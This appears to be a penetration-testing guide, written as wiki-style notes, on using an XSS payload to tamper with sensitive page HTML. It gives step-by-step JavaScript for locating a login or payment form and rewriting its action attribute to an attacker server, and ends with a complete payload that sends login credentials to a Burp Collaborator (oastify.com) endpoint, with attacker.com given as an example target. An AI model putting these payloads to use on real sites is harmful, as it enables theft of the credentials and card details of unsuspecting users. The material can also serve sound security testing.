If your XSS payload lands on the same page as sensitive client-side HTML responsible for collecting user data (e.g., a payment `<form>`), you can modify the HTML to do something malicious (e.g., send the payment details to an attacker-controlled server). 

The intention behind this Impact Technique is to modify client-side HTML that does something interesting. This will usually involve modifying client-side HTML or JavaScript responsible for collecting sensitive data from the user and submitting it to the backend. For this reason, `<form>`, `<iframe>`, and `<input>` HTML elements are generally what you will want to look for. 

If you are aiming to simply retrieve sensitive data from the backend, please see [[Session Hijacking]].

This Impact Step has three steps:
1. Identify sensitive HTML
2. Modify the HTML
3. Create server infrastructure (optional)

# 1. Identify Sensitive HTML
Scroll up and down the page to see if there are any instances of sensitive HTML. Some examples may include:
- An HTML `<form>` that collects sensitive data (payment card information, personally identifiable data, credentials, etc.)
- An `<iframe>` element that hosts a third-party site, which collects sensitive data.
- An `<img>` element that displays something sensitive for the user to validate/process, like a QR code.

Right-click the interesting HTML and select "Inspect" to view the element in the browser's Document-Object Model (DOM). Take note of any attributes set in the HTML element. 

Once you have located an interesting HTML element, proceed.

# 2. Modify the HTML
## 2a. Dynamically Retrieve the HTML Element
Once you've identified an interesting HTML element, you now must retrieve it with your XSS payload. The correct solution depends on what attributes are set in the element.

TIP: Sometimes, your XSS payload will load before the element you are targeting. In this case, you must wait a few seconds before trying to retrieve and modify the element. You can use the following JavaScript to wait for an arbitrary number of seconds:
```js
function waitXSeconds(x) {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve('resolved');
            // Put "real" XSS payload here
        }, x * 1000);
    });
}

async function asyncCall(x) {
    console.log('calling');
    const result = await waitXSeconds(x);
    console.log(result);
}

asyncCall(5); // wait 5 seconds
```
- Note the comment above (`// Put "real"...`). This is where you would put the actual XSS payload logic. 


**getElementById**: 
If the element has an `id` attribute set (e.g.):
```html
<form id="login-form" action=/login method="post">
...
</form>
```

...you can use `getElementById` in your XSS payload:
```js
var targetHTML = document.getElementById("login-form");
```
- Replace `"login-form"` with the ID of the element you are targeting.
- Although there should only ever be one element with a particular ID, the browser will allow multiple elements with the same ID to render (you may see an error in the Console Log, however). If there are multiple elements with the same ID, and the above payload retrieves the wrong element, proceed to **getElementsByTagName** below.

It can be helpful to paste your payload into the Developer's Console while testing:
![[Pasted image 20240206110228.png|750]]

**getElementsByTagName**:
If the element does not have an `id` attribute (e.g.):
```html
<form action=/login method="post">
...
</form>
```

...you can use `getElementsByTagName` in your XSS payload:
```js
var targetHTML = document.getElementsByTagName("form")[0];
```
- Replace `"form"` with the type of element you are targeting.

Note the index at the end (`[0]`). If the page has multiple `<form>` elements (or whatever element you are targeting), you may need to adjust the index accordingly. 

As seen above, it can be helpful to test your payload in the Developer Console.

## 2b. Modify the Element
Now that you've retrieved the target element with your XSS payload, you need to modify the HTML to suit your purposes. 

For a `<form>`, you typically would change the `action` attribute to point elsewhere:
```js
targetHTML.action = "<ATTACKER-SERVER-URL>";
```
- Replace `<ATTACKER-SERVER-URL>` with the full URL to an endpoint on a server you control. 
	- E.g., `https://attacker.com/login-exfiltration`
- If you are modifying a different attribute, adjust as needed.

Some common attributes to modify:
- `<form>` element's `action` attribute.
- `<iframe>` element's `src` attribute.
- `<iframe>` element's `action` attribute.
- `<img>` element's `src` attribute.

## 2c. Putting Everything Together
Putting the above steps together might result in a payload that looks like the following:
```js
function waitXSeconds(x) {
	return new Promise(resolve => {
		setTimeout(() => {
			resolve('resolved');
			var targetHTML = document.getElementById("login-form");
			targetHTML.action = "https://i3m573nxa6i8zmqxrvcy87a9x03rrhf6.oastify.com/credentials"
		}, x * 1000);
	});
}

async function asyncCall(x) {
	console.log('calling');
	const result = await waitXSeconds(x);
	console.log(result);
}

asyncCall(5); // wait 5 seconds
```

Upon submitting the form, the user's credentials would then be sent to Burp Collaborator instead of the intended destination:
![[Pasted image 20240206131452.png|1000]]

# 3. Create Server Infrastructure (optional)
If your modifications to the client-side HTML involve exfiltrating data, you could use either Burp Collaborator or a Flask Application running on a cloud compute instance to receive the exfiltrated data. Please see [[Session Token Exfiltration#2. Using the Cookie]] for examples.